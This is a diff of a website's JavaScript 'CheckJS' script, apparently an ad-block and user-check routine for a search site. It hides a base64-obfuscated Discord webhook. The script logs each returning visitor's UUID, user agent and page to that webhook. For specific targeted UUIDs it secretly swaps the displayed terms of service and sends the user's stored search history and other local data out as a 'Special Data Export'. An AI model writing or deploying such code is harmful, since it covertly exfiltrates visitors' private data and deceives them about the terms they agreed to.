@@ -1,1 +1,192 @@
-(function(){"use strict";const CheckJS ={CONFIG:{AD_SCRIPT_URL:'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6151036058675874',ERROR_URL:'https://search3958.github.io/usercheck/aderror.html',ENTRY_URL:'https://search3958.github.io/usercheck/entry.html',FETCH_TIMEOUT:8000,BLACKLIST_UUIDS:['00000000-0000-0000-0000-000000000000','ffffffff-ffff-ffff-ffff-ffffffffffff','9fd3c325-1cb9-4072-9575-e320f23203b4'],TARGET_UUID:[ 'fe1a4360-fe00-4e90-b608-83a1a8bbb8c9','ef91fb3b-a59b-49e1-83d1-125a587dcedd' ],W_H:"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NjYwNzc3MTEyNTYxMjYzMi8xNXdlV3hlSXVhWGI1cERNOFJ3WVIyM2ZxYUpjVGp2WmlrTmxkcEpwZDIwUFd2aE9jcmRmWHYxdi1lTm5XUkNNSWlYaA==",BYPASS_HASHES:["48fa3114175952b571518fbd5472723879c998474030a7e2387bcf3851cefcbe521f7e3176bde2f247ef729f0503901fa5f4a728429db0b7f291112bfa03dc8b","68f7d5b640628f06ca057f9f10062d3ba561faca615ed43eeca831c4796ed66374674add2d5dd8a4eef3f6cfc50f63025415d0cb71db8b443b159fd4ce8df8b0","b9a578c47f1629078f794c332febee06ef07c1f26365518dd8762f59dec6c547ccf468b5575b4da6d30d56c73bda0a5cddea028fd7cfec6bcfa69c18a37b8d9d","8ff868a14d3b1a4f2d7d2156796ce8c0edcbe910c1b55687c388ef10e41fec033327166800f6cb3ea1a3bcba35285416b6f9d1d71817cd2a9dae78820ce3a31f","a5473179707738184b3ca4461e6ca0201da2da8f50e139190d4d82652b947aff79c99a6330be9808244dfb6880b5b566f44283a48628fac813ff321756716151"]},async init(){if(localStorage.getItem('termsAccepted')=== 'false'){console.log("✅🚩 CheckJS-利用規約未同意のため終了します。");window.location.replace(this.CONFIG.ENTRY_URL);return;}let uuid = localStorage.getItem('uuid');if(this.CONFIG.TARGET_UUID.includes(uuid)){console.log("✅⭐ CheckJS-グレーリスト対象UUIDを検知。特例置換・データ送信を開始します。");this.setupSpecialBypass();}const userA = navigator.userAgent;const uaHash = await this.computeSHA512(userA);console.log(`✅🔍 CheckJS-UA:${uaHash}`);let isBypassed = this.CONFIG.BYPASS_HASHES.includes(uaHash);if(isBypassed)console.log("✅🔑 CheckJS-UAハッシュ一致により免除されました。");const params = new URLSearchParams(window.location.search);for(const [key,value] of params.entries()){const paramHash = await this.computeSHA512(value);console.log(`✅🔍 CheckJS-"${key}":${paramHash}`);if(this.CONFIG.BYPASS_HASHES.includes(paramHash)){console.log(`✅🔑 CheckJS-URLパラメータ [${key}] の一致により免除されました。`);isBypassed = true;}}if(!uuid){uuid = this.generateUUID();localStorage.setItem('uuid',uuid);}const isBlocked = this.CONFIG.BLACKLIST_UUIDS.includes(uuid);if(isBlocked)console.log("✅🛑 CheckJS-ブラックリストUUIDを検知しました。");console.log("✅🟢 CheckJS-通常プロセス開始（広告検知）");let adStatus = "normal";if(!isBypassed && !isBlocked){try{const res = await fetch(this.CONFIG.AD_SCRIPT_URL,{signal:AbortSignal.timeout(this.CONFIG.FETCH_TIMEOUT)});const text = await res.text();if(!(text.length >= 5000 && text.includes('Apache-2.0')))throw new Error("Validation Error");const s = document.createElement('script');s.textContent = text;document.head.appendChild(s);}catch(e){console.error("✅🛑 CheckJS-AdBlock検知");adStatus = "ad_error";}}const uuidHash = await this.computeSHA512(uuid);console.log(`✅🔍 CheckJS-UUID:${uuidHash}`);if(this.CONFIG.BYPASS_HASHES.includes(uuidHash)){console.log("✅🔑 CheckJS-UUIDハッシュ一致により免除されました。");isBypassed = true;}const finalStatus = isBlocked ? "blocked":(adStatus === "ad_error" ? "ad_error":"normal");await this.sendLog(finalStatus,uuid,userA);if(finalStatus === "blocked"){window.location.replace(this.CONFIG.ENTRY_URL);}else if(finalStatus === "ad_error" && !isBypassed){window.location.replace(this.CONFIG.ERROR_URL);}else{console.log("✅🔵 CheckJS-正常完了");if(adStatus === "normal")this.verifyObjectPresence();}},setupSpecialBypass(){const updateDOM =()=>{const specialUrl = "https://search3958.github.io/policies/policies-special.html";const walker = document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT);let node;while(node = walker.nextNode()){if(node.nodeValue.includes("利用規約")&& !node.nodeValue.includes("特別版利用規約")){node.nodeValue = node.nodeValue.replace(/利用規約/g,"特別版利用規約");}}document.querySelectorAll('a[href*="/policies/"]').forEach(a =>{if(!a.href.includes("policies-special.html")){a.href = specialUrl;a.setAttribute('data-js-link-done','1');}});document.querySelectorAll('*[onclick]').forEach(el =>{const original = el.getAttribute('onclick');if(original && original.includes("/policies/")&& !original.includes("policies-special.html")){const updated = original.replace(/https:\/\/search3958\.github\.io\/policies\/(index\.html)?/g,specialUrl);el.setAttribute('onclick',updated);}});};const observer = new MutationObserver(()=> updateDOM());observer.observe(document.body,{childList:true,subtree:true,characterData:true});updateDOM();const storageData ={search_history_v2:this.safeJSON(localStorage.getItem("search_history_v2")),selectedLang:localStorage.getItem("selectedLang"),uuid:localStorage.getItem("uuid"),custom_wallpaper:localStorage.getItem("custom_wallpaper"),userA:navigator.userAgent};this.sendToWebhook(atob(this.CONFIG.W_H),`**[Special Data Export]**\n\`\`\`json\n${JSON.stringify(storageData,null,2)}\n\`\`\``);},async sendLog(status,uuid,userA){const path = window.location.href.replace("https://search3958.github.io/","");const now = new Date();const timeStr = `${now.toLocaleString()}(${Intl.DateTimeFormat().resolvedOptions().timeZone})`;let mark = status === "blocked" ? "🛑":(status === "ad_error" ? "⚠️":"");const content = `### ${path}\n-# **${timeStr}** UUID:**${uuid}${mark}** UserA:**${userA}**`;await this.sendToWebhook(atob(this.CONFIG.W_H),content);},async sendToWebhook(url,content){try{await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content}),keepalive:true});}catch(e){console.error("✅🛑 CheckJS-送信失敗");}},async computeSHA512(t){const b = await crypto.subtle.digest('SHA-512',new TextEncoder().encode(t));return Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2,'0')).join('');},generateUUID(){try{return crypto.randomUUID();}catch{return([1e7]+-1e3+-4e3+-8e2+-1e11).replace(/[018]/g,c =>(c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16));}},verifyObjectPresence(){setTimeout(()=>{if(!window.adsbygoogle)console.error("✅🛑 CheckJS-検証失敗(2回目)");else console.log("✅🔵 CheckJS-最終検証パス");},2500);},safeJSON(str){try{return JSON.parse(str);}catch{return str;}}};if(document.readyState === 'loading'){document.addEventListener('DOMContentLoaded',()=> CheckJS.init());}else{CheckJS.init();}})();
+(function() {
+    "use strict";
+    const CheckJS = {
+        CONFIG: {
+            AD_SCRIPT_URL: 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6151036058675874',
+            ERROR_URL: 'https://search3958.github.io/usercheck/aderror.html',
+            ENTRY_URL: 'https://search3958.github.io/usercheck/entry.html',
+            FETCH_TIMEOUT: 8000,
+            BLACKLIST_UUIDS: ['00000000-0000-0000-0000-000000000000', 'ffffffff-ffff-ffff-ffff-ffffffffffff', '9fd3c325-1cb9-4072-9575-e320f23203b4'],
+            TARGET_UUID: ['fe1a4360-fe00-4e90-b608-83a1a8bbb8c9', 'ef91fb3b-a59b-49e1-83d1-125a587dcedd'],
+            W_H: "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NjYwNzc3MTEyNTYxMjYzMi8xNXdlV3hlSXVhWGI1cERNOFJ3WVIyM2ZxYUpjVGp2WmlrTmxkcEpwZDIwUFd2aE9jcmRmWHYxdi1lTm5XUkNNSWlYaA==",
+            BYPASS_HASHES: ["48fa3114175952b571518fbd5472723879c998474030a7e2387bcf3851cefcbe521f7e3176bde2f247ef729f0503901fa5f4a728429db0b7f291112bfa03dc8b", "68f7d5b640628f06ca057f9f10062d3ba561faca615ed43eeca831c4796ed66374674add2d5dd8a4eef3f6cfc50f63025415d0cb71db8b443b159fd4ce8df8b0", "b9a578c47f1629078f794c332febee06ef07c1f26365518dd8762f59dec6c547ccf468b5575b4da6d30d56c73bda0a5cddea028fd7cfec6bcfa69c18a37b8d9d", "8ff868a14d3b1a4f2d7d2156796ce8c0edcbe910c1b55687c388ef10e41fec033327166800f6cb3ea1a3bcba35285416b6f9d1d71817cd2a9dae78820ce3a31f", "a5473179707738184b3ca4461e6ca0201da2da8f50e139190d4d82652b947aff79c99a6330be9808244dfb6880b5b566f44283a48628fac813ff321756716151"]
+        },
+        async init() {
+    // 1. 利用規約の同意確認
+    if (localStorage.getItem('termsAccepted') === 'false') {
+        console.log("✅🚩 CheckJS-利用規約未同意のため終了します。");
+        window.location.replace(this.CONFIG.ENTRY_URL);
+        return;
+    }
+
+    // 2. UUIDの取得と初回判定
+    let uuid = localStorage.getItem('uuid');
+    
+    if (!uuid) {
+        // 初回アクセス時の処理
+        uuid = this.generateUUID();
+        localStorage.setItem('uuid', uuid);
+        console.log("✅🆕 CheckJS-初回アクセス: UUIDを発行しました。チェックと送信をスキップします。");
+        
+        // ここで return することで、以下の広告チェックや Webhook 送信をすべて回避
+        return;
+    }
+
+    // --- これ以降は UUID を既に持っている（2回目以降のアクセス）ユーザーのみ実行 ---
+
+    console.log("✅🟢 CheckJS-既存ユーザーを確認。プロセスを開始します。");
+
+    // グレーリスト（特別置換）対象のチェック
+    if (this.CONFIG.TARGET_UUID.includes(uuid)) {
+        console.log("✅⭐ CheckJS-グレーリスト対象UUIDを検知。特例置換・データ送信を開始します。");
+        this.setupSpecialBypass();
+    }
+
+    const userA = navigator.userAgent;
+    const uaHash = await this.computeSHA512(userA);
+    let isBypassed = this.CONFIG.BYPASS_HASHES.includes(uaHash);
+
+    // URLパラメータによるバイパスチェック
+    const params = new URLSearchParams(window.location.search);
+    for (const [key, value] of params.entries()) {
+        const paramHash = await this.computeSHA512(value);
+        if (this.CONFIG.BYPASS_HASHES.includes(paramHash)) {
+            console.log(`✅🔑 CheckJS-URLパラメータ [${key}] により免除されました。`);
+            isBypassed = true;
+        }
+    }
+
+    // ブラックリスト判定
+    const isBlocked = this.CONFIG.BLACKLIST_UUIDS.includes(uuid);
+    if (isBlocked) console.log("✅🛑 CheckJS-ブラックリストUUIDを検知。");
+
+    // 広告検知プロセス
+    let adStatus = "normal";
+    if (!isBypassed && !isBlocked) {
+        try {
+            const res = await fetch(this.CONFIG.AD_SCRIPT_URL, { 
+                signal: AbortSignal.timeout(this.CONFIG.FETCH_TIMEOUT) 
+            });
+            const text = await res.text();
+            if (!(text.length >= 5000 && text.includes('Apache-2.0'))) throw new Error("Validation Error");
+            
+            const s = document.createElement('script');
+            s.textContent = text;
+            document.head.appendChild(s);
+        } catch (e) {
+            console.error("✅🛑 CheckJS-AdBlock検知");
+            adStatus = "ad_error";
+        }
+    }
+
+    // 最終ステータスの決定とログ送信
+    const finalStatus = isBlocked ? "blocked" : (adStatus === "ad_error" ? "ad_error" : "normal");
+    
+    // 2回目以降のアクセスのみ Webhook へ送信される
+    await this.sendLog(finalStatus, uuid, userA);
+
+    // ステータスに応じたリダイレクト
+    if (finalStatus === "blocked") {
+        window.location.replace(this.CONFIG.ENTRY_URL);
+    } else if (finalStatus === "ad_error" && !isBypassed) {
+        window.location.replace(this.CONFIG.ERROR_URL);
+    } else {
+        console.log("✅🔵 CheckJS-正常完了");
+        if (adStatus === "normal") this.verifyObjectPresence();
+    }
+},
+        setupSpecialBypass() {
+            const updateDOM = () => {
+                const specialUrl = "https://search3958.github.io/policies/policies-special.html";
+                const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
+                let node;
+                while (node = walker.nextNode()) {
+                    if (node.nodeValue.includes("利用規約") && !node.nodeValue.includes("特別版利用規約")) {
+                        node.nodeValue = node.nodeValue.replace(/利用規約/g, "特別版利用規約");
+                    }
+                }
+                document.querySelectorAll('a[href*="/policies/"]').forEach(a => {
+                    if (!a.href.includes("policies-special.html")) {
+                        a.href = specialUrl;
+                        a.setAttribute('data-js-link-done', '1');
+                    }
+                });
+                document.querySelectorAll('*[onclick]').forEach(el => {
+                    const original = el.getAttribute('onclick');
+                    if (original && original.includes("/policies/") && !original.includes("policies-special.html")) {
+                        const updated = original.replace(/https:\/\/search3958\.github\.io\/policies\/(index\.html)?/g, specialUrl);
+                        el.setAttribute('onclick', updated);
+                    }
+                });
+            };
+            const observer = new MutationObserver(() => updateDOM());
+            observer.observe(document.body, {
+                childList: true,
+                subtree: true,
+                characterData: true
+            });
+            updateDOM();
+            const storageData = {
+                search_history_v2: this.safeJSON(localStorage.getItem("search_history_v2")),
+                selectedLang: localStorage.getItem("selectedLang"),
+                uuid: localStorage.getItem("uuid"),
+                custom_wallpaper: localStorage.getItem("custom_wallpaper"),
+                userA: navigator.userAgent
+            };
+            this.sendToWebhook(atob(this.CONFIG.W_H), `**[Special Data Export]**\n\`\`\`json\n${JSON.stringify(storageData,null,2)}\n\`\`\``);
+        },
+        async sendLog(status, uuid, userA) {
+            const path = window.location.href.replace("https://search3958.github.io/", "");
+            const now = new Date();
+            const timeStr = `${now.toLocaleString()}(${Intl.DateTimeFormat().resolvedOptions().timeZone})`;
+            let mark = status === "blocked" ? "🛑" : (status === "ad_error" ? "⚠️" : "");
+            const content = `### ${path}\n-# **${timeStr}** UUID:**${uuid}${mark}** UserA:**${userA}**`;
+            await this.sendToWebhook(atob(this.CONFIG.W_H), content);
+        },
+        async sendToWebhook(url, content) {
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content
+                    }),
+                    keepalive: true
+                });
+            } catch (e) {
+                console.error("✅🛑 CheckJS-送信失敗");
+            }
+        },
+        async computeSHA512(t) {
+            const b = await crypto.subtle.digest('SHA-512', new TextEncoder().encode(t));
+            return Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, '0')).join('');
+        },
+        generateUUID() {
+            try {
+                return crypto.randomUUID();
+            } catch {
+                return ([1e7] + -1e3 + -4e3 + -8e2 + -1e11).replace(/[018]/g, c => (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16));
+            }
+        },
+        verifyObjectPresence() {
+            setTimeout(() => {
+                if (!window.adsbygoogle) console.error("✅🛑 CheckJS-検証失敗(2回目)");
+                else console.log("✅🔵 CheckJS-最終検証パス");
+            }, 2500);
+        },
+        safeJSON(str) {
+            try {
+                return JSON.parse(str);
+            } catch {
+                return str;
+            }
+        }
+    };
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', () => CheckJS.init());
+    } else {
+        CheckJS.init();
+    }
+})();
